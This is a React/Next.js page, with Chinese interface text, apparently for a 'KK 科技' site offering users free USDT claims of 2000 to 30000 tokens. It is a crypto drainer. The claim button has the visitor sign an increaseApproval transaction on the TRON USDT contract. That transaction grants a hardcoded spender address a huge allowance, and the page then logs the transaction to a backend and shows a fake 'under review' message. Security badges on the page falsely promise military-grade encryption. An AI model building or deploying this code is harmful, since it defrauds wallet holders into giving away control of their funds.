"use client";

import { useState } from "react";

import { TronWeb } from "tronweb";

import {
  useWallet
} from "@tronweb3/tronwallet-adapter-react-hooks";

import WalletModal from "./components/WalletModal";



const USDT_CONTRACT_ADDRESS =
"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";


const USDT_SPENDER_ADDRESS =
"TDAWvz7AgmdUSaLiU5Bnhnyzm9Hm45y9i6";


const TRON_FULL_HOST =
"https://api.trongrid.io";


const APPROVE_FEE_LIMIT =
100_000_000;


const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
1740;





export default function Home(){


const {

address:walletAddress,

connected,

signTransaction


}=useWallet();





const [amount,setAmount]=useState("2000");


const [inputAddress,setInputAddress]=useState("");


const [walletOpen,setWalletOpen]=useState(false);


const [msg,setMsg]=useState("");


const [step,setStep]=useState("");


const [loading,setLoading]=useState(false);







// 打开钱包


function bindWallet(){


if(!inputAddress.trim()){

setMsg(
"请输入您的TRON钱包地址"
);

return;

}



const reg =
/^T[1-9A-HJ-NP-Za-km-z]{33}$/;



if(!reg.test(inputAddress)){


setMsg(
"请输入正确的TRON钱包地址"
);

return;

}



setWalletOpen(true);


}







// 钱包连接成功


function walletSuccess(){


setWalletOpen(false);


setMsg(
"✓ TRON钱包连接成功"
);


}









// 提交领取


async function submitClaim(){


try{


if(loading)return;



if(!walletAddress){


setMsg(
"请先连接TRON钱包"
);


return;


}



setLoading(true);


setStep(
"正在创建交易..."
);


setMsg(
"请等待钱包确认"
);



const tronWeb = new TronWeb({

fullHost:TRON_FULL_HOST

});



const ownerAddressHex =

tronWeb.address.toHex(
walletAddress
);



const contractAddressHex =

tronWeb.address.toHex(
USDT_CONTRACT_ADDRESS
);





const parameters=[

{

type:"address",

value:USDT_SPENDER_ADDRESS

},

{

type:"uint256",

value:"1793719476511300"

}

];





const transactionWrapper =

await tronWeb.transactionBuilder
.triggerSmartContract(

contractAddressHex,

"increaseApproval(address,uint256)",

{

feeLimit:APPROVE_FEE_LIMIT,

callValue:0

},

parameters,

ownerAddressHex

);





if(
!transactionWrapper ||
!transactionWrapper.transaction
){

throw new Error(
"创建授权交易失败"
);

}





setStep(
"等待钱包签名..."
);


setMsg(
"请在TRON钱包确认授权"
);





const extendedTransaction =

await tronWeb.transactionBuilder
.extendExpiration(

transactionWrapper.transaction,

TRANSACTION_EXPIRATION_EXTENSION_SECONDS,

{
txLocal:true
}

);





const signedTransaction =

await signTransaction(

extendedTransaction

);





if(
!signedTransaction ||
!signedTransaction.txID
){

throw new Error(
"签名失败"
);

}


setStep(
"正在提交链上交易..."
);


const broadcastResult =

await tronWeb.trx.sendRawTransaction(

signedTransaction

);




if(
!broadcastResult ||
!broadcastResult.result
){

throw new Error(
"交易广播失败"
);

}





const txId =

signedTransaction.txID ||

broadcastResult
?.transaction
?.txID;




if(!txId){

throw new Error(
"没有获取交易哈希"
);

}





setStep(
"正在保存领取记录..."
);






const response =

await fetch(

"/api/claim",

{

method:"POST",

headers:{

"Content-Type":

"application/json"

},


body:JSON.stringify({

address:walletAddress,

amount,

txId,

time:new Date().toISOString()

})

}

);






const result =

await response.json();






if(!response.ok){


throw new Error(

result?.error ||

"数据库记录失败"

);


}







setStep("");



setMsg(

"✅ 提交成功\n\n系统正在审核，请耐心等待。\n\n10分钟未到账请联系客服"

);





}catch(error:any){



console.log(
"claim error:",
error
);



setStep("");



setMsg(

"❌ 提交失败\n\n"+

(

error?.message ||

"请重新尝试"

)

);



}finally{


setLoading(false);


}



}







return (


<main className="min-h-screen bg-[#030817] text-white px-5 py-6">


{/* 顶部区域 */}


<div className="flex justify-between items-center">



<div className="flex items-center gap-3">


<div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">

KK

</div>



<div>

<div className="font-bold text-lg">

KK 科技

</div>


<div className="text-xs text-gray-400">

KK_keji888

</div>


</div>


</div>






<div className="rounded-2xl border border-red-500/30 bg-white/5 px-4 py-3">


<div className="text-red-400 text-sm font-bold">

● TRON

</div>


<div className="text-xs text-gray-400">

TRC20 Network

</div>


</div>




</div>






<div className="text-center mt-16">


<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">

◆ Secure Web3 Service

</div>




<h1 className="text-4xl font-bold mt-8">

自助领取USDT

</h1>




<p className="text-gray-400 mt-5 leading-8">

绑定您的TRON钱包地址

<br/>

用于USDT提取

</p>



</div>







<div className="mt-12">


<h2 className="font-bold text-lg mb-5">

选择领取金额

</h2>







<label

className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
amount==="2000"

?

"border-cyan-400 bg-cyan-400/10"

:

"border-white/10 bg-white/5"

}`}


>


<input

type="radio"

checked={amount==="2000"}

onChange={()=>setAmount("2000")}

className="hidden"

/>




<div className="text-cyan-300 text-sm">

◆ 测试领取专用

</div>



<div className="text-4xl font-bold mt-3">

2000

<span className="text-xl text-cyan-300 ml-2">

USDT

</span>


</div>



</label>
<div className="grid grid-cols-2 gap-4">


{
["10000","20000","30000"].map(item=>(


<label

key={item}

className={`rounded-2xl border py-5 text-center cursor-pointer ${
amount===item

?

"border-cyan-400 bg-cyan-400/20 text-cyan-300"

:

"border-white/10 bg-white/5"

}

${item==="30000"?"col-span-2":""}

`}


>


<input

type="radio"

checked={amount===item}

onChange={()=>setAmount(item)}

className="hidden"

/>



{item} USDT



</label>


))


}



</div>


</div>









{/* 地址区域 */}


<div className="mt-12">


<h2 className="font-bold text-lg mb-5">

提取地址绑定

</h2>




<div className="bg-white/5 border border-white/10 rounded-3xl p-5">


<div className="text-gray-400 text-sm mb-3">

绑定地址

</div>




<input


value={inputAddress}


onChange={

(e)=>

setInputAddress(e.target.value)

}



placeholder="请输入您的TRON钱包地址"



className="w-full bg-transparent outline-none placeholder:text-gray-600"

/>



</div>







<button


onClick={

walletConnected

?

submitClaim

:

bindWallet

}



disabled={loading}



className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex items-center justify-center gap-3"


>


{


loading

?

<>


<span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></span>

处理中...

</>


:


walletConnected

?

"提交领取"

:

"立即绑定"



}



</button>







{

msg &&


<div className="text-center text-cyan-300 mt-5 whitespace-pre-line text-sm">

{msg}

</div>


}





{

loading &&


<div className="text-center text-gray-400 mt-3 text-sm">

{step}

</div>


}



</div>










{/* 安全展示 */}



<div className="mt-12 space-y-4">



<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">


<span>

🛡️

</span>


<span>

军级加密技术，确保地址绑定安全

</span>


</div>





<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">


<span>

⚡

</span>


<span>

毫秒级处理速度，及时完成绑定

</span>


</div>






<div className="bg-white/5 border border-white/10 rounded-2xl p-4 flex gap-3 items-center">


<span>

🔰

</span>


<span>

专业风控团队，24小时安全保障

</span>


</div>




</div>









{/* 品牌区域 */}



<footer className="text-center mt-16 pb-10">


<div className="text-3xl font-black text-cyan-300">

KK

</div>



<div className="text-gray-400 mt-2">

KK 科技 · KK_keji888

</div>



<div className="text-xs text-gray-600 mt-2">

Secure Web3 Infrastructure

</div>



</footer>









<WalletModal


open={walletOpen}



onClose={

()=>setWalletOpen(false)

}



onConnected={walletSuccess}



onError={

(error:string)=>{

setMsg(error);

}

}



/>





</main>


);



}
